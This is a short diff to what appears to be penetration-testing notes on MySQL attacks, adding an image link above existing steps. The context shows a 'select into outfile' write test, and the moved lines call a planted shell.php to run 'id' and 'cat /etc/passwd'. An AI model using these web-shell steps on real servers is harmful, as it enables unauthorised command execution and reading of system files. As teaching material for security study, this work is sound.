@@ -114,8 +114,9 @@
     - select 'This is a test' into outfile '/tmp/test' from mysql.user limit 1;
       - > if executed, confirms the ability to write files on the web server. Image1
     - Now navigate to that path where you write the shell.php
-      - `<url>/shell.php?cmd=id`
-      - `<url>/shell.php?cmd=cat /etc/passwd`
+      - [image](https://github.com/Chittu13/web/blob/main/Image/mysql.png)
+        - `<url>/shell.php?cmd=id`
+        - `<url>/shell.php?cmd=cat /etc/passwd`
 
 
 
